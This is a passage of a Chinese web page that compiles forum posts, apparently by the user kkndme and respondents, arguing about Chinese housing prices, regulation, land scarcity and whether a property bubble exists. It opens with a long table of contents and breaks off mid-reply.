<li><a href="#4%E6%88%BF%E4%BB%B7%E4%B8%8A%E6%B6%A8%E9%80%A0%E6%88%90%E7%89%A9%E4%BB%B7%E4%B8%8A%E6%B6%A8%E4%BA%BA%E6%B0%91%E7%94%9F%E6%B4%BB%E5%8F%98%E5%BE%97%E5%9B%B0%E9%9A%BE">4、房价上涨造成物价上涨，人民生活变得困难</a></li>
</ul>
</li>
<li><a href="#%E6%88%BF%E5%9C%B0%E4%BA%A7%E8%B0%83%E6%8E%A7%E7%9A%84%E7%9C%9F%E6%AD%A3%E6%84%8F%E5%9B%BE%E9%80%9A%E8%BF%87%E5%9E%84%E6%96%AD%E8%8E%B7%E5%8F%96%E5%88%A9%E7%9B%8A%E6%9C%80%E5%A4%A7%E5%8C%96%E5%9B%BD%E5%AF%8C%E6%B0%91%E7%A9%B7">房地产调控的真正意图（通过垄断获取利益最大化：国富民穷）</a></li>
<li><a href="#%E8%AF%B4%E5%88%B0%E6%88%BF%E4%BA%A7%E6%B3%A1%E6%B2%AB%E7%9A%84%E9%97%AE%E9%A2%98">说到房产泡沫的问题</a><ul>
<li><a href="#1%E5%85%88%E8%AF%B4%E8%AF%B4%E5%AE%98%E6%96%B9%E7%9A%84%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE%E9%80%89%E6%8B%A9%E6%80%A7%E5%A4%B1%E6%98%8E">1、先说说官方的统计数据。(选择性失明)</a></li>
</ul>
</li>
<li><a href="#%E6%88%BF%E5%9C%B0%E4%BA%A7%E8%B0%83%E6%8E%A7%E5%B7%A5%E5%85%B7%E6%88%BF%E4%BA%A7%E7%A8%8E">房地产调控工具：房产税？</a></li>
<li><a href="#%E5%9E%84%E6%96%AD%E8%BF%98%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%86%B3%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E7%A4%BE%E4%BC%9A%E7%A8%B3%E5%AE%9A">垄断还可以解决一个问题：社会稳定。</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E5%9E%84%E6%96%AD%E6%88%BF%E5%B1%8B%E6%88%BF%E7%A7%9F">如何垄断房屋、房租？</a></li>
<li><a href="#%E5%9B%BD%E5%AE%B6%E5%9E%84%E6%96%AD%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%BD%B1%E5%93%8D">国家垄断带来的影响</a></li>
<li><a href="#%E5%85%AC%E7%A7%9F%E6%88%BF%E9%97%AE%E9%A2%98">公租房问题</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BB%BA%E5%85%AC%E7%A7%9F%E6%88%BF%E7%9A%84%E9%92%B1%E4%BB%8E%E5%93%AA%E5%84%BF%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98">如何解决建公租房的钱从哪儿来的问题？</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E5%BE%81%E7%A8%8E%E8%B0%83%E8%8A%82%E8%B4%AB%E5%AF%8C%E5%B7%AE%E8%B7%9D%E6%98%AF%E8%80%8D%E6%B5%81%E6%B0%93%E5%9B%A0%E4%B8%BA%E5%AF%8C%E7%9A%84%E4%BA%BA%E8%B4%9F%E8%B4%A3%E5%88%B6%E5%AE%9A%E6%94%BF%E7%AD%96%E5%AF%8C%E7%9A%84%E4%BA%BA%E4%B8%8D%E4%BC%9A%E8%AE%A9%E6%94%BF%E7%AD%96%E9%92%88%E5%AF%B9%E8%87%AA%E5%B7%B1">通过征税调节贫富差距是耍流氓（因为富的人负责制定政策，富的人不会让政策针对自己）</a></li>
<li><a href="#%E6%88%BF%E4%BB%B7%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%B6%A8">房价什么时候会涨</a></li>
<li><a href="#%E4%B8%BA%E4%BA%BA%E6%B0%91%E6%9C%8D%E5%8A%A1%E5%B0%B1%E6%98%AF%E7%9E%8E%E6%8E%B0">为人民服务就是瞎掰</a></li>
<li><a href="#%E6%88%BF%E7%A7%9F%E9%97%AE%E9%A2%98">房租问题</a></li>
<li><a href="#%E7%B2%AE%E9%A3%9F%E9%97%AE%E9%A2%98">粮食问题</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%82%BB%E7%A9%BA">什么是傻空？</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9C%9F%E4%B9%B0%E4%B8%8D%E8%B5%B7%E6%88%BF">什么是真买不起房？</a></li>
<li><a href="#%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E8%A6%81%E6%B7%B1%E5%85%A5">分析问题要深入</a></li>
<li><a href="#%E4%BB%8E%E8%B4%B5%E9%98%B3%E7%9A%84%E7%8E%B0%E7%8A%B6%E7%9C%8B%E4%B8%AD%E5%9B%BD%E7%9A%84%E6%9C%AA%E6%9D%A5">从贵阳的现状看中国的未来</a></li>
<li><a href="#%E8%B4%A7%E5%B8%81%E8%B4%AC%E5%80%BC">货币贬值</a></li>
<li><a href="#%E6%88%BF%E4%BB%B7%E5%8F%AF%E8%83%BD%E7%9A%84%E4%B8%8B%E8%B7%8C%E6%96%B9%E5%BC%8F">房价可能的下跌方式</a></li>
<li><a href="#%E6%88%BF%E4%BA%A7%E6%8A%95%E8%B5%84%E7%9A%84%E9%97%AE%E9%A2%98">房产投资的问题</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E6%97%B6%E6%9C%BA">买房时机</a></li>
<li><a href="#%E5%85%B3%E4%BA%8E%E8%B0%83%E6%8E%A7">关于调控</a></li>
<li><a href="#%E6%99%AE%E9%80%9A%E4%BA%BA%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E">普通人该怎么办？</a></li>
<li><a href="#%E4%BD%93%E5%88%B6%E5%A4%96%E4%BA%BA%E5%91%98%E5%85%BB%E8%80%81%E7%A1%AE%E5%AE%9E%E6%98%AF%E4%B8%AA%E9%97%AE%E9%A2%98">体制外人员养老确实是个问题</a></li>
<li><a href="#%E6%87%82%E6%94%BF%E7%AD%96%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7">懂政策的重要性</a></li>
<li><a href="#%E5%AD%98%E9%92%B1%E4%B8%8D%E5%A6%82%E5%AD%98%E6%88%BF%E5%AD%90%E5%AD%98%E6%9C%A8%E5%A4%B4%E5%AD%98%E6%A0%91">存钱不如存房子、存木头、存树</a></li>
<li><a href="#%E6%94%BF%E5%BA%9C%E4%B8%8D%E8%80%83%E8%99%91%E6%B0%91%E7%94%9F">政府不考虑民生</a></li>
<li><a href="#%E5%86%8D%E8%B0%88%E4%B9%B0%E6%88%BF%E6%97%B6%E6%9C%BA">再谈买房时机</a></li>
<li><a href="#%E5%88%A9%E7%9B%8A%E6%89%8D%E6%98%AFzf%E8%A1%8C%E4%B8%BA%E7%9A%84%E6%8C%87%E6%8C%A5%E6%A3%92">利益才是zf行为的指挥棒</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E5%BA%94%E8%AF%A5%E5%85%B3%E6%B3%A8%E4%BB%80%E4%B9%88">买房应该关注什么？</a></li>
<li><a href="#%E6%B5%81%E6%B0%93%E6%97%A0%E4%BA%A7%E8%80%85">流氓无产者</a></li>
<li><a href="#%E6%94%BF%E5%BA%9C%E8%B0%83%E6%8E%A7%E7%9A%84%E7%9B%AE%E7%9A%84%E4%B8%8E%E5%90%AF%E7%A4%BA">政府调控的目的与启示</a></li>
<li><a href="#%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%99%BA%E6%85%A7%E5%92%8C%E6%89%8D%E5%B9%B2%E5%86%B3%E5%AE%9A%E4%BA%86%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%91%BD%E8%BF%90">个人的智慧和才干决定了个人的命运</a></li>
<li><a href="#%E9%87%91%E9%92%B1%E8%87%B3%E4%B8%8A">金钱至上</a></li>
<li><a href="#%E4%BE%9B%E6%B1%82%E5%85%B3%E7%B3%BB">供求关系</a></li>
<li><a href="#%E6%8B%86%E8%BF%81%E8%A1%A5%E5%81%BF">拆迁补偿</a></li>
<li><a href="#%E6%89%A7%E6%94%BF%E8%80%85%E5%A6%82%E4%BD%95%E6%B2%BB%E5%9B%BD">执政者如何治国</a></li>
<li><a href="#10-%E5%B9%B4%E6%88%BF%E5%9C%B0%E4%BA%A7%E8%B0%83%E6%8E%A7">10 年房地产调控</a></li>
<li><a href="#%E5%85%B3%E4%BA%8E%E6%88%BF%E8%B4%B7">关于房贷</a></li>
<li><a href="#%E5%85%B3%E4%BA%8E%E5%95%86%E9%93%BA%E6%8A%95%E8%B5%84">关于商铺投资</a></li>
<li><a href="#%E5%85%B3%E4%BA%8E%E6%88%BF%E4%BA%A7%E7%A8%8E">关于房产税</a></li>
<li><a href="#%E5%85%B3%E4%BA%8E%E6%8B%86%E8%BF%81">关于拆迁</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E5%92%8C%E4%B8%8D%E4%B9%B0%E6%88%BF%E7%9A%84%E5%B7%AE%E8%B7%9D">买房和不买房的差距</a></li>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%8E%B0%E5%9C%A8%E7%A7%9F%E5%94%AE%E6%AF%94%E8%BF%99%E4%B9%88%E4%BD%8E">为什么现在租售比这么低？</a></li>
<li><a href="#%E6%88%BF%E4%BA%A7%E4%BA%A4%E6%98%93%E5%8E%86%E5%8F%B2">房产交易历史</a></li>
<li><a href="#%E5%A5%91%E7%A8%8E%E7%9A%84%E5%8E%86%E5%8F%B2">契税的历史</a></li>
<li><a href="#%E5%BB%89%E7%A7%9F%E6%88%BF%E7%9A%84%E5%8E%86%E5%8F%B2">廉租房的历史</a></li>
<li><a href="#%E5%8E%86%E5%8F%B2%E4%B8%8A%E4%B9%B0%E6%88%BF%E6%9C%80%E5%A5%BD%E7%9A%84%E6%9C%9D%E4%BB%A3">历史上买房最好的朝代</a></li>
<li><a href="#%E6%9C%AA%E6%9D%A5%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%B8%82%E5%9C%BA%E7%9A%84%E5%8F%91%E5%B1%95">未来房地产市场的发展</a></li>
<li><a href="#%E6%88%BF%E4%BA%A7%E5%88%B0%E6%9C%9F">房产到期</a></li>
<li><a href="#%E4%B9%B0%E5%AD%A6%E5%8C%BA%E6%88%BF%E9%97%AE%E9%A2%98">买学区房问题</a></li>
<li><a href="#%E4%BA%BA%E5%8F%A3%E6%99%AE%E6%9F%A5">人口普查</a></li>
<li><a href="#%E6%98%86%E5%B1%B1">昆山</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E4%BA%89%E5%8F%96%E4%B8%80%E6%AD%A5%E5%88%B0%E4%BD%8D">买房争取一步到位</a></li>
<li><a href="#%E6%94%B6%E5%85%A5%E7%A8%B3%E5%AE%9A%E7%9A%84%E5%AE%B6%E5%BA%AD%E5%A6%82%E4%BD%95%E4%B9%B0%E6%88%BF">收入稳定的家庭如何买房</a></li>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%BA%E5%8F%A3%E7%BA%A2%E5%88%A9%E6%B6%88%E5%A4%B1%E6%9C%AA%E6%9D%A5%E7%9A%84%E6%88%BF%E5%AD%90%E8%BF%98%E7%9C%8B%E6%B6%A8">为什么人口红利消失，未来的房子还看涨</a></li>
<li><a href="#%E6%84%8F%E5%A4%A7%E5%88%A9%E7%9A%84%E4%BD%8F%E6%88%BF%E6%A8%A1%E5%BC%8F">意大利的住房模式</a></li>
<li><a href="#%E4%B8%AD%E5%9B%BD%E7%9A%84%E5%AD%A6%E6%9C%AF">中国的学术</a></li>
<li><a href="#%E7%B2%BE%E8%8B%B1%E7%9A%84%E8%B4%A2%E4%BA%A7">精英的财产</a></li>
<li><a href="#%E4%B8%AD%E5%9B%BD%E7%9A%84%E6%96%B0%E9%97%BB%E4%B8%8D%E5%8F%AF%E4%BF%A1">中国的新闻不可信</a></li>
<li><a href="#%E9%80%9A%E8%B4%A7%E8%86%A8%E8%83%80%E5%92%8C%E6%88%BF%E4%BB%B7%E7%9A%84%E5%85%B3%E7%B3%BB">通货膨胀和房价的关系</a></li>
<li><a href="#%E8%87%AA%E4%BD%8F%E4%B9%B0%E6%88%BF">自住买房</a></li>
<li><a href="#%E4%B8%AD%E5%9B%BD%E7%9A%84%E6%9C%9D%E4%BB%A3%E6%9B%B4%E6%9B%BF">中国的朝代更替</a></li>
<li><a href="#%E8%81%8A%E8%81%8A%E4%BF%84%E7%BD%97%E6%96%AF">聊聊俄罗斯</a></li>
<li><a href="#%E6%AF%9B%E5%A4%AA%E9%98%B3%E7%9A%84%E5%BE%80%E4%BA%8B">毛太阳的往事</a></li>
<li><a href="#%E5%AF%8C%E4%BA%BA%E8%B6%8A%E5%AF%8C%E7%A9%B7%E4%BA%BA%E8%B6%8A%E7%A9%B7">富人越富、穷人越穷</a></li>
<li><a href="#%E9%80%9A%E8%B4%A7%E8%86%A8%E8%83%80%E7%9A%84%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0">通货膨胀的形成原因</a></li>
<li><a href="#%E6%9C%89%E5%A4%96%E6%9D%A5%E4%BA%BA%E5%8F%A3%E5%92%8C%E6%B2%A1%E6%9C%89%E5%A4%96%E6%9D%A5%E4%BA%BA%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB">有外来人口和没有外来人口的区别</a></li>
<li><a href="#%E9%A6%96%E4%BB%98%E6%8F%90%E9%AB%98%E7%9A%84%E9%80%BB%E8%BE%91">首付提高的逻辑</a></li>
<li><a href="#%E6%94%BF%E5%BA%9C%E6%90%AC%E8%BF%81">政府搬迁</a></li>
<li><a href="#kkndme%E8%81%8A%E5%8C%97%E5%AE%8B%E5%94%90%E6%9C%9D">kkndme聊北宋、唐朝</a></li>
<li><a href="#%E7%8E%8B%E5%AE%89%E7%9F%B3%E7%9A%84%E9%9D%92%E8%8B%97%E6%B3%95%E4%B9%8B%E5%9B%BD%E5%AE%B6%E5%87%BA%E6%94%BF%E7%AD%96%E7%9A%84%E5%8A%A8%E6%9C%BA">王安石的青苗法之国家出政策的动机</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%A4%BE%E4%BC%9A%E5%85%AC%E5%B9%B3">什么是社会公平</a></li>
<li><a href="#%E8%BF%98%E6%98%AF%E6%9C%89%E5%BE%88%E5%A4%9A%E6%9C%89%E9%92%B1%E4%BA%BA">还是有很多有钱人</a></li>
<li><a href="#%E5%8F%8C%E8%BD%A8%E5%88%B6%E4%B9%8B%E4%BD%93%E5%88%B6%E5%86%85%E7%9A%84%E7%A6%8F%E5%88%A9">双轨制之体制内的福利</a></li>
<li><a href="#%E5%BC%80%E5%8F%91%E5%95%86%E6%80%9D%E7%BB%B4">开发商思维</a></li>
<li><a href="#%E5%86%9C%E6%B0%91%E6%94%BF%E6%9D%83%E7%9A%84%E7%BC%BA%E7%82%B9">农民政权的缺点</a></li>
<li><a href="#%E9%83%91%E5%B7%9E%E6%9C%89%E5%89%8D%E6%99%AF">郑州有前景</a></li>
<li><a href="#%E5%85%AC%E5%9B%AD%E5%9C%B0%E4%BA%A7%E6%98%AF%E7%A8%80%E7%BC%BA%E8%B5%84%E6%BA%90">公园地产是稀缺资源</a></li>
<li><a href="#%E5%BC%A0%E7%8C%AE%E5%BF%A0%E5%B1%A0%E5%B7%9D">张献忠屠川</a></li>
<li><a href="#%E6%B4%AA%E7%A7%80%E5%85%A8%E9%BB%84%E5%B7%A2%E6%9D%8E%E8%87%AA%E6%88%90">洪秀全、黄巢、李自成</a></li>
<li><a href="#%E6%9C%B1%E5%85%83%E7%92%8B">朱元璋</a></li>
<li><a href="#%E6%9B%B9%E5%8F%82%E6%B2%BB%E5%9B%BD">曹参治国</a></li>
<li><a href="#%E6%99%81%E9%94%99">晁错</a></li>
<li><a href="#%E6%B0%91%E8%90%A5%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9A%84%E8%80%81%E6%9D%BF%E5%92%8C%E6%89%93%E5%B7%A5%E8%80%85">民营小企业的老板和打工者</a></li>
<li><a href="#%E9%83%AD%E8%A7%A3">郭解</a></li>
<li><a href="#2010%E5%B9%B4%E7%9A%84%E4%B8%AD%E5%9B%BD%E6%88%BF%E5%9C%B0%E4%BA%A7">2010年的中国房地产</a></li>
<li><a href="#%E7%B2%BE%E8%8B%B1%E4%BA%BA%E7%BE%A4%E7%9A%84%E5%B9%B3%E5%9D%87%E6%94%B6%E5%85%A5%E5%86%B3%E5%AE%9A%E6%88%BF%E4%BB%B7">精英人群的平均收入决定房价</a></li>
<li><a href="#%E5%86%85%E5%9C%B0%E4%B8%8D%E6%98%AF%E9%A6%99%E6%B8%AF%E6%B5%B7%E5%8D%97">内地不是香港、海南</a></li>
<li><a href="#%E5%8E%86%E5%8F%B2%E6%98%AF%E4%B8%80%E9%9D%A2%E9%95%9C%E5%AD%90">历史是一面镜子</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E4%B8%80%E6%AC%A1%E6%80%A7%E5%88%B0%E4%BD%8D%E6%AF%94%E8%BE%83%E5%A5%BD">买房一次性到位比较好</a></li>
<li><a href="#%E5%A4%96%E6%B1%87%E7%AE%A1%E5%88%B6">外汇管制</a></li>
<li><a href="#%E4%B8%80%E7%BA%BF%E5%92%8C%E4%BA%8C%E7%BA%BF">一线和二线</a></li>
<li><a href="#%E5%90%95%E5%90%8E%E7%AF%A1%E6%9D%83">吕后篡权</a></li>
<li><a href="#%E5%B0%8F%E4%BA%A7%E6%9D%83%E6%88%BF">小产权房</a></li>
<li><a href="#%E5%95%86%E9%93%BA%E5%92%8C%E4%BD%8F%E5%AE%85">商铺和住宅</a></li>
<li><a href="#%E4%BD%93%E5%88%B6%E5%86%85%E5%A4%96">体制内外</a></li>
<li><a href="#2010%E5%B9%B4%E7%9A%84%E4%B8%8A%E6%B5%B7">2010年的上海</a></li>
<li><a href="#%E4%B9%B0%E6%88%BF%E7%89%A9%E4%B8%9A%E4%B8%8E%E6%88%BF%E8%B4%B7">买房：物业与房贷</a></li>
<li><a href="#%E6%94%B6%E7%B4%A7%E4%BD%8F%E6%88%BF%E8%B4%B7%E6%AC%BE">收紧住房贷款</a></li>
<li><a href="#%E5%A5%B8%E8%87%A3%E8%94%A1%E4%BA%AC">奸臣蔡京</a></li>
<li><a href="#%E4%BD%93%E5%88%B6%E5%86%85%E7%9A%8428%E5%8E%9F%E5%88%99">体制内的28原则</a></li>
<li><a href="#%E8%B4%BE%E8%B0%8A">贾谊</a></li>
<li><a href="#kkndme-%E6%8E%A8%E8%8D%90%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6">kkndme 推荐的历史书</a></li>
<li><a href="#%E5%B9%B4%E8%BD%BB%E4%BA%BA%E8%A6%81%E6%97%A9%E4%B9%B0%E6%88%BF">年轻人要早买房</a></li>
<li><a href="#%E4%B8%8D%E8%A6%81%E4%BD%8E%E4%BC%B0%E9%80%9A%E8%B4%A7%E8%86%A8%E8%83%80">不要低估通货膨胀</a></li>
<li><a href="#%E4%BA%8C%E4%B8%89%E7%BA%BF%E5%9F%8E%E5%B8%82%E4%B8%8E%E9%87%8D%E5%BA%86">二三线城市与重庆</a></li>
<li><a href="#%E5%9F%8E%E5%8C%BA%E5%92%8C%E9%83%8A%E5%8C%BA">城区和郊区</a></li>
<li><a href="#%E5%AE%88%E7%9D%80%E9%87%91%E7%A2%97%E8%A6%81%E9%A5%AD%E5%90%83">守着金碗要饭吃</a></li>
<li><a href="#%E4%BA%BA%E5%88%B6%E7%9A%84%E7%A4%BE%E4%BC%9A%E4%BA%BA%E5%B0%B1%E6%98%AF%E5%88%B6%E5%BA%A6">人制的社会，人就是制度</a></li>
<li><a href="#%E5%87%86%E5%85%AC%E5%8A%A1%E5%91%98%E7%9A%84%E5%A5%BD%E5%A4%84">准公务员的好处</a></li>
<li><a href="#%E4%BA%8C%E4%B8%89%E7%BA%BF%E5%9F%8E%E5%B8%82%E7%9A%84%E5%8F%91%E5%B1%95%E9%9D%A0%E6%8B%86%E8%BF%81">二三线城市的发展靠拆迁</a></li>
<li><a href="#%E4%B8%80%E4%B8%AA%E5%BF%BD%E6%82%A0%E4%BA%86%E5%87%A0%E4%BA%BF%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E4%BC%AA%E6%A6%82%E5%BF%B5%E6%89%80%E8%B0%93%E4%B8%AD%E5%9B%BD%E6%88%BF%E5%9C%B0%E4%BA%A7%E6%B3%A1%E6%B2%AB">一个忽悠了几亿中国人的伪概念：所谓“中国房地产泡沫”</a></li>
<li><a href="#%E6%8B%86%E8%BF%81%E8%A1%A5%E5%81%BF">拆迁补偿</a></li>
<li><a href="#%E5%9F%8E%E5%B8%82%E5%BA%95%E5%B1%82">城市底层</a></li>
<li><a href="#%E5%9E%84%E6%96%AD%E4%BC%81%E4%B8%9A">垄断企业</a></li>
<li><a href="#%E5%86%9C%E6%9D%91%E8%87%AA%E6%9D%A5%E6%B0%B4">农村自来水</a></li>
<li><a href="#%E8%A2%81%E7%9B%8E">袁盎</a></li>
<li><a href="#%E4%BA%8C%E4%B8%89%E7%BA%BF%E5%9F%8E%E5%B8%82%E9%80%89%E6%96%B0%E5%9F%8E%E8%BF%98%E6%98%AF%E8%80%81%E5%9F%8E">二三线城市，选新城还是老城</a></li>
<li><a href="#%E5%9C%A8%E4%B8%AD%E5%9B%BD%E6%99%AE%E9%80%9A%E4%BA%BA%E6%89%8B%E4%B8%8A%E9%97%B2%E9%92%B1%E4%B8%8D%E5%A4%9A%E7%9A%84%E4%BA%BA%E8%A2%AB%E5%89%A5%E5%89%8A">在中国，普通人手上闲钱不多的人被剥削</a></li>
<li><a href="#%E4%B8%89%E5%88%86%E5%A4%A9%E6%B3%A8%E5%AE%9A%E4%B8%83%E5%88%86%E9%9D%A0%E6%89%93%E6%8B%BC">三分天注定七分靠打拼</a></li>
<li><a href="#%E4%BA%BA%E7%9A%84%E5%89%8D%E7%A8%8B%E6%9C%89%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%8D%E6%8E%8C%E6%8F%A1%E5%9C%A8%E8%87%AA%E5%B7%B1%E6%89%8B%E9%87%8C">人的前程有的时候不掌握在自己手里</a></li>
<li><a href="#%E6%B2%B3%E5%8D%97%E9%83%91%E5%B7%9E-%E4%B8%8E-%E6%B4%9B%E9%98%B3">河南郑州 与 洛阳</a></li>
<li><a href="#%E6%9D%AD%E5%B7%9E">杭州</a></li>
<li><a href="#%E8%A5%BF%E5%AE%89-%E4%B8%8E-%E9%87%8D%E5%BA%86">西安 与 重庆</a></li>
<li><a href="#%E8%B0%A2%E5%9B%BD%E4%B8%AD%E7%A9%BA%E7%BD%AE%E7%8E%87">谢国中「空置率」</a></li>
<li><a href="#%E6%89%93%E5%B7%A5%E4%B8%8D%E5%A6%82%E6%9C%89%E4%B8%80%E6%8A%80%E4%B9%8B%E9%95%BF%E7%9A%84%E5%B0%8F%E8%80%81%E6%9D%BF">打工不如有一技之长的小老板</a></li>
<li><a href="#%E4%B8%80%E7%BA%BF%E3%80%81%E4%BA%8C%E7%BA%BF%E7%9A%84%E7%94%9F%E6%B4%BB">一线、二线的生活</a></li>
<li><a href="#%E6%88%BF%E5%AD%90%E4%B8%8D%E5%B1%9E%E4%BA%8E%E5%B8%82%E5%9C%BA%E7%BB%8F%E6%B5%8E%EF%BC%88%E9%98%B4%E8%B0%8B%E8%AE%BA%E7%9A%84%E8%A7%92%E5%BA%A6%EF%BC%89">房子不属于市场经济（阴谋论的角度）</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A5%BD%E7%9A%84%E6%94%BF%E7%AD%96">什么是好的政策</a></li>
</ul>
<h2 id="房地产调控表面上看起来的理由有三条："><a href="#房地产调控表面上看起来的理由有三条：" class="headerlink" title="房地产调控表面上看起来的理由有三条："></a>房地产调控表面上看起来的理由有三条：</h2><ul>
<li>1）人人都有居住权。</li>
<li>2）房子是用来住的，不是用来炒的。</li>
<li>3）房子太贵了<ul>
<li>1）租售比严重不合理</li>
<li>2）空置率太高</li>
<li>3）人均收入太低，早晚要崩盘。</li>
<li>4）房价上涨造成物价上涨，人民生活变得困难。</li>
</ul>
</li>
</ul>
<h3 id="1、人人都有居住权"><a href="#1、人人都有居住权" class="headerlink" title="1、人人都有居住权"></a>1、人人都有居住权</h3><p>任志强说的并没有错，居者有其屋并不等于人人享有商品房的产权。居住的房屋也不等于商品房。</p>
<blockquote>
<p>liougehooa</p>
<p>任志强这句话绝对没说炒房价，房子在他眼里还是住的。<br>难道你用byt是你老er比较稀缺才买？那也没看见byt暴涨到5W一个。<br>”而土地所具备稀缺性？“任志强也说了，拿出全国耕地的1%也够老百姓住了！现在是啥科技了，舍掉1%耕地对农作物有什么影响？</p>
<p>kkndme:</p>
<p>华北平原从河北到山东有大片的盐碱地，你都可以用于盖房，而且会非常便宜，也没有人跟你竞价。但是你在那里盖了房子并不能保证你天天按时在北京城区上班。</p>
</blockquote>
<blockquote>
<p><strong>bryanshen:</strong></p>
<p>人人都有居住权不等于人人都拥有一套商品房，人人都有居住权等于人人都可以有房子住，这个房子可以是买商品房，也可以租政府建的公租房、廉租房。</p>
</blockquote>
<h3 id="2、房子是用来住的，不是用来炒的"><a href="#2、房子是用来住的，不是用来炒的" class="headerlink" title="2、房子是用来住的，不是用来炒的"></a>2、房子是用来住的，不是用来炒的</h3><p>房子包括房屋及房屋所属的土地两个部分。</p>
<p>房屋本身只有居住价值；而土地所具备稀缺性，决定了土地的投资价值。</p>
<p>房地产贵的不是房屋，而是房屋下面那块地皮。所以商品房具备了投资与自住双重属性。</p>
<blockquote>
<p><strong>bryanshen:</strong></p>
<p>房子是用来住的，不是用来炒的？</p>
<p>虽然这么说可能政治不正确，但这句话很有问题。</p>
<p>我们口中的房子由房屋和房屋下的土地共同组成的。 </p>
<p>房屋本身作为商品是可以像汽车一样流水线化生产的，只有居住价值。 </p>
<p>但是房屋下的土地是政府招拍挂供给的，政府通过控制土地供给，让土地具备了稀缺性，土地因为稀缺性决定了土地有投资价值。 </p>
<p>房子贵的不是房屋，而是房屋下面的那块土地，因为土地有投资属性，决定了房子一定会被炒。 </p>
</blockquote>
<h3 id="3、房子太贵了"><a href="#3、房子太贵了" class="headerlink" title="3、房子太贵了"></a>3、房子太贵了</h3><p>这个问题比较大。<br>房价是不是太贵了？有没有泡沫？</p>
<p>我们首先从国民的收入结构来分析</p>
<p>一个遵从“丛林法则”的精英社会决定了国民收入的金字塔结构。</p>
<p>既然是金字塔，底端的中低收入者占据了金子塔的最大比例，但是大家要知道金字塔的顶端既使只有10%人口，那也将是一个1亿多的绝对庞大的数字，远远超过了绝大多数西方国家的人口总和。</p>
<p>而北上广深以及三十多个省会，这些个靠掠夺全国或者一省资源，以牺牲大多数人口的利益为代价发展壮大起来的超大型及大型城市，需要容纳全国1亿多的精英人群，是否能得出房地产严重泡沫，空置率过高的结论？</p>
<p>当低收入者们努力挥洒汗水期望着自己年薪能够超过5万，8万，10万。。。的时候，他们可能做梦也想不出精英阶层手中究竟拥有多少财富。</p>
<p>精英们会象流氓无产者们一厢情愿认为的那样：因为一个区区房产税而恐慌性抛弃手中的大量房产吗？</p>
<blockquote>
<p><strong>liougehooa:</strong></p>
<p>现在不说哪个富豪不是靠偷税漏税爆发的，我就举个例子，一套房不收税，二套房也不收税，三套房收300%税，你龟儿子还敢买三套房？</p>
<p><strong>kkndme:</strong></p>
<p>你说的事情在历史上已有发生，大明律明令禁止超标准建房，如果违禁，不仅仅是收税的问题，而是打板子下大狱，没收充公的，比房产税可要狠多了。但是终究没能执行下去，原因在于官员太腐败，不符合官员地主阶层的利益，最后名存实亡了。光是梗着脖子叫唤是没有用的，利益驱动着社会的发展，违背统治阶层利益的事情即使出台也难以执行，最后的下场都是不了了之。</p>
</blockquote>
<p>答案显然是否定的。</p>
<p>可以确认的是，<strong>房价不是由统计局的平均收入决定的。而是精英的平均收入决定的。</strong></p>
<p>为了便于分析，我们剥离掉商品房（注意：只是商品房，而不是房屋）的社会属性，先把它看做商品。是商品就有他的内在规律。</p>
<p>什么决定商品的价格，价值？对不起，我只能说你上学上傻了。</p>
<p>是供求关系，只有供求关系。</p>
<p>我们判断一个核心城市市区内的商品房是具备足够稀缺性的。</p>
<p>如果你在北京海淀区上班，即使你在山海关拥有1000平方米的住宅也不能替代你住在北京市近郊区以内的愿望。</p>
<p>而无论你是租房，分房还是买房，只要你还在海淀区上班，你就必须住在北京市近郊区以内。</p>
<p>假设你挣得钱不足够多，你需要租一套房子解决你的上班问题，上班距离的远近及居住的质量，取决于你愿意支付的租金。</p>
<p>假设你的钱够买房子，我相信你更愿意买房，因为你可以拥有房屋的产权和房产增值的收益。而买房子的大小，品质，离你上班的远近，取决于你手中的资金和你对未来收入的预期。</p>
<p>买房问题很象是中国的上学问题，而且简直是异曲同工。</p>
<p>假设你家附近有个重点中学，教学质量很好，考大学几率很高，而其他的学校你觉得不理想，你肯定希望无论如何自家小孩也要上这个重点中学。</p>
<p>上重点中学凭什么？我们简单的剥离掉其他社会因素的影响，可以认为想上重点中学就要凭好成绩，小孩努力考到前多少名，就可以上重点中学。这与努力赚钱买房是一个道理，有钱的出高价就能买到好位置好环境的房子。</p>
<p>我们再加入社会因素的影响，比如某大人物看到这个中学很抢手，很可以赚一笔，于是就设计了加分项，谁给自己送的钱多，就给谁加分，于是小孩要上重点中学不但要考高分，还要送钱加分。</p>
<p>同理，当好位置的商品房成为稀缺资源，各类炒房客的出现是必然的。</p>
<p>如果说炒房客加高价给最终住户的行为会产生泡沫，那么重点小学和公立幼儿园高昂的择校费应不应该也叫做泡沫？</p>
<blockquote>
<p><strong>liougehooa:</strong></p>
